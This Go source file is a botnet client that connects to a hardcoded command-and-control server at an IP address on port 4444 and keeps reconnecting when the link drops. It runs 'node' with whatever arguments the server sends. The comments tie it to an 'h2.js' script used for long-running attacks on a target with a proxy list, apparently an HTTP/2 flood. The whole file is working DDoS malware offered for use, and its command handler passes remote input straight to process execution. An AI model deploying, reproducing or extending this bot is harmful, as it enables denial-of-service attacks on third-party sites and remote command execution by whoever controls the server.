// Run this bot.go on a server that has h2.js
// run in the background ( so the bot doesn't die )
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"io"
	"time"
)

func main() {
	c2IP := "37.49.227.141" // c2 server 
	if len(os.Args) > 1 {
		c2IP = os.Args[1]
	}
	
	c2Port := "4444"
	if len(os.Args) > 2 {
		c2Port = os.Args[2]
	}
	
	fmt.Printf("[*] Connecting to C2 at %s:%s...\n", c2IP, c2Port)
	
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", c2IP, c2Port))
		if err != nil {
			fmt.Printf("[!] Failed to connect: %s. Retrying in 5s...\n", err.Error())
			time.Sleep(5 * time.Second)
			continue
		}
		
		fmt.Println("[+] Connected to C2")
		handleConnection(conn)
		conn.Close()
		
		fmt.Println("[*] Disconnected. Reconnecting in 5s...")
		time.Sleep(5 * time.Second)
	}
}

func handleConnection(conn net.Conn) {
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)
	
	for {
	
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		message, err := reader.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				fmt.Println("[!] Connection error:", err)
			}
			return
		}
		
		message = strings.TrimSpace(message)
		
		switch {
		case message == "BOT_REGISTERED":
			fmt.Println("[+] Bot registered successfully")
			
		case message == "PING":
		
			writer.WriteString("PONG\n")
			writer.Flush()
			
		case strings.HasPrefix(message, "CMD:"):
			command := strings.TrimPrefix(message, "CMD:")
			fmt.Printf("[*] Received command: %s\n", command)
			
			// Execute command
			response := executeCommand(command)
			
			// Send response back
			writer.WriteString("RESPONSE:" + response + "\n")
			writer.Flush()
			
		default:
			fmt.Printf("[*] Received: %s\n", message)
		}
	}
}

func executeCommand(command string) string {
	// Parse command: node h2 target time 32 10 ips.txt
	parts := strings.Fields(command)
	if len(parts) < 2 {
		return "ERROR: Invalid command format. Expected: node <args>"
	}
	
	// Build the node command - pass all arguments after "node"
	// parts[0] should be "node"
	args := parts[1:] // Take everything after "node"
	
	// Create command with all arguments
	cmd := exec.Command("node", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	
	// Start the command
	err := cmd.Start()
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to start command: %s", err.Error())
	}
	
	// Send response immediately (don't wait for completion for long-running attacks)
	go func() {
		err := cmd.Wait()
		if err != nil {
			fmt.Printf("[!] Command finished with error: %s\n", err.Error())
		} else {
			fmt.Println("[+] Command completed successfully")
		}
	}()
	
	return "OK: Command started successfully"
}